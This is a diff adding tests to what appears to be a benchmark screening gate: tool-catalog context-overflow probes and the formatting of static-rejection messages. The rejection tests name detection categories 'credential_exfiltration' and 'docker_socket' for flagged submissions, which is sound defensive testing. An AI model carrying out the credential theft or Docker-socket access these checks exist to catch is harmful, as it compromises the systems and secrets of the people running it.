+    calls: list[list[str]], *, forward: int | None, run_exit: int = 0
+) -> Callable[..., Any]:
+    """`_ok_run` whose harness forwards ``forward`` of the offered tools.
+
+    It reads the staged ``/run`` body from the gateway state directory and
+    appends what the real sidecar gateway would measure for the chat request
+    the harness makes. ``forward=None`` forwards the whole catalog.
+    """
+    ok = _ok_run(calls)
+    state: dict[str, Path] = {}
+
+    async def run(
+        args: list[str], *, stdin: Any = None, **kwargs: Any
+    ) -> tuple[int, str]:
+        if args[0] == "run":
+            for index, arg in enumerate(args[:-1]):
+                if arg == "-v" and args[index + 1].endswith(":/state"):
+                    state["dir"] = Path(args[index + 1].rsplit(":", 1)[0])
+        if args[0] == "exec" and "http://harness:8080/run" in args:
+            calls.append(args)
+            staged = args[args.index("http://harness:8080/run") + 2]
+            assert staged == "@/state/tool-catalog-run.json"
+            request = json.loads((state["dir"] / "tool-catalog-run.json").read_bytes())
+            tools = request["tools"] if forward is None else request["tools"][:forward]
+            body = json.dumps(
+                {
+                    "model": "openai/gpt-oss-20b",
+                    "messages": [
+                        {"role": "system", "content": request["system_prompt"]},
+                        {"role": "user", "content": request["user_input"]},
+                    ],
+                    "tools": [{"type": "function", "function": t} for t in tools],
+                }
+            ).encode()
+            with (state["dir"] / "model-requests").open("ab") as log:
+                log.write(json.dumps(measure_model_request(body)).encode() + b"\n")
+            if run_exit:
+                return run_exit, "HTTP 500: boom"
+            return 0, '{"answer": "ok", "tool_calls": []}'
+        return await ok(args, stdin=stdin, **kwargs)
+
+    return run
+
+
+async def _screen_v18(gate: BuildGate, tarball: bytes):  # type: ignore[no-untyped-def]
+    async with gate._client:
+        return await gate.screen(
+            agent_id=_AGENT,
+            attempt_id=_ATTEMPT,
+            bench_version=18,
+            miner_hotkey=_MINER,
+            sha256=hashlib.sha256(tarball).hexdigest(),
+            download_url=_URL,
+        )
+
+
+def _catalog_runs(calls: list[list[str]]) -> list[list[str]]:
+    return [call for call in calls if "http://harness:8080/run" in call]
+
+
+async def test_tool_catalog_probe_passes_a_harness_that_selects_tools(
+    make_config: Callable[..., ScreenerConfig],
+) -> None:
+    tarball = _valid_tar()
+    calls: list[list[str]] = []
+    gate = _gate_with(
+        make_config(tool_catalog_probe_mode="enforce"),
+        _catalog_probe_run(calls, forward=8),
+        tarball=tarball,
+    )
+    result = await _screen_v18(gate, tarball)
+
+    assert result.outcome == ScreeningOutcome.PASS
+    assert len(_catalog_runs(calls)) == 1
+    # The ~1 MiB body travels as a staged file, never as a process argument
+    # (Linux caps one argument at 128 KiB).
+    assert all(len(arg) < 128 * 1024 for arg in _catalog_runs(calls)[0])
+    codes = [item.code for item in result.evidence]
+    assert "tool-catalog-context-overflow" not in codes
+    size = next(i for i in result.evidence if i.code == "tool-catalog-request-size")
+    assert "8 tools" in size.summary
+    assert "Groq" not in size.summary
+
+
+async def test_tool_catalog_probe_enforce_rejects_a_context_overflow(
+    make_config: Callable[..., ScreenerConfig],
+) -> None:
+    tarball = _valid_tar()
+    calls: list[list[str]] = []
+    gate = _gate_with(
+        make_config(tool_catalog_probe_mode="enforce"),
+        _catalog_probe_run(calls, forward=None),
+        tarball=tarball,
+    )
+    result = await _screen_v18(gate, tarball)
+
+    assert result.outcome == ScreeningOutcome.DETERMINISTIC_REJECT
+    assert result.reason_code == "tool-catalog-context-overflow"
+    assert "131072-token context window" in result.detail
+    assert "2000 tool definitions" in result.detail
+    assert (
+        reason_code_class("tool-catalog-context-overflow")
+        == ReasonCodeClass.AGENT_FAULT
+    )
+
+
+async def test_tool_catalog_probe_shadow_records_an_overflow_without_failing(
+    make_config: Callable[..., ScreenerConfig],
+) -> None:
+    tarball = _valid_tar()
+    calls: list[list[str]] = []
+    gate = _gate_with(
+        make_config(),  # shadow is the default
+        _catalog_probe_run(calls, forward=None),
+        tarball=tarball,
+    )
+    result = await _screen_v18(gate, tarball)
+
+    assert result.outcome == ScreeningOutcome.PASS
+    assert result.reason_code != "tool-catalog-context-overflow"
+    codes = [item.code for item in result.evidence]
+    assert "tool-catalog-context-overflow" in codes
+    size = next(i for i in result.evidence if i.code == "tool-catalog-request-size")
+    assert "2000 tools" in size.summary and "Groq" in size.summary
+
+
+async def test_tool_catalog_probe_passes_when_the_run_fails(
+    make_config: Callable[..., ScreenerConfig],
+) -> None:
+    # A failed /run says nothing certain about the request size. The probe
+    # still judges only what the gateway measured.
+    tarball = _valid_tar()
+    calls: list[list[str]] = []
+    gate = _gate_with(
+        make_config(tool_catalog_probe_mode="enforce"),
+        _catalog_probe_run(calls, forward=0, run_exit=22),
+        tarball=tarball,
+    )
+    result = await _screen_v18(gate, tarball)
+
+    assert result.outcome == ScreeningOutcome.PASS
+    size = next(i for i in result.evidence if i.code == "tool-catalog-request-size")
+    assert "/run failed" in size.summary
+
+
+@pytest.mark.parametrize(
+    ("mode", "bench_version"), [("off", 18), ("enforce", 17), ("shadow", 12)]
+)
+async def test_tool_catalog_probe_skips_when_off_or_before_v18(
+    make_config: Callable[..., ScreenerConfig], mode: str, bench_version: int
+) -> None:
+    tarball = _valid_tar()
+    calls: list[list[str]] = []
+    gate = _gate_with(
+        make_config(tool_catalog_probe_mode=mode),
+        _catalog_probe_run(calls, forward=None),
+        tarball=tarball,
+    )
+    async with gate._client:
+        result = await gate.screen(
+            agent_id=_AGENT,
+            attempt_id=_ATTEMPT,
+            bench_version=bench_version,
+            miner_hotkey=_MINER,
+            sha256=hashlib.sha256(tarball).hexdigest(),
+            download_url=_URL,
+        )
+
+    assert result.outcome == ScreeningOutcome.PASS
+    assert not _catalog_runs(calls)
+    assert not any(i.code.startswith("tool-catalog-") for i in result.evidence)
+
+
 def test_screening_locks_the_same_persistence_paths_as_scoring() -> None:
     # The scorer pins DITTOBENCH_DB and DITTOBENCH_MEMORY_PATH into the miner
     # sandbox. Screening runs the same envelope, so a harness honouring either
@@ -4081,3 +4626,51 @@ def test_gate_retries_a_relayed_provider_body_fault_once(make_config) -> None:  
     # relayed provider fault and parked as l3-adjudicator-model-provider-fault.
     gate = _gate_with(make_config(), _ok_run(), tarball=_valid_tar())
     assert gate._source_reviewer._l2._retry_provider_body_fault_once is True
+
+
+def test_static_reject_detail_keeps_its_brackets_when_bounded() -> None:
+    """Long paths drop whole trailing locations, never the closing brackets."""
+    from ditto_screener.gate import static_malicious_source_detail
+    from ditto_screener.policy import SourceReviewObservation
+
+    evidence = [
+        {"path": f"{'deep/' * 30}file_{index}.py", "line": index + 1, "category": "c"}
+        for index in range(16)
+    ]
+    observation = SourceReviewObservation(
+        ok=True,
+        risk_level="high",
+        finding_digest="ab" * 32,
+        categories=("credential_exfiltration",),
+        finding={"evidence": evidence},
+    )
+    detail = static_malicious_source_detail(observation)
+
+    assert len(detail) <= 1000
+    assert detail.startswith(
+        "static safety check matched categories=[credential_exfiltration] locations=["
+    )
+    assert "]; remove or make the flagged code unreachable and resubmit" in detail
+    assert "file_0.py:1" in detail
+
+
+def test_static_reject_detail_omits_paths_with_list_delimiters() -> None:
+    from ditto_screener.gate import static_malicious_source_detail
+    from ditto_screener.policy import SourceReviewObservation
+
+    observation = SourceReviewObservation(
+        ok=True,
+        risk_level="high",
+        finding_digest="ab" * 32,
+        categories=("docker_socket",),
+        finding={
+            "evidence": [
+                {"path": "a,b.py", "line": 1, "category": "c"},
+                {"path": "x]y.py", "line": 2, "category": "c"},
+                {"path": "ok.py", "line": 3, "category": "c"},
+            ]
+        },
+    )
+    detail = static_malicious_source_detail(observation)
+    assert "locations=[ok.py:3]" in detail
+    assert "a,b.py" not in detail
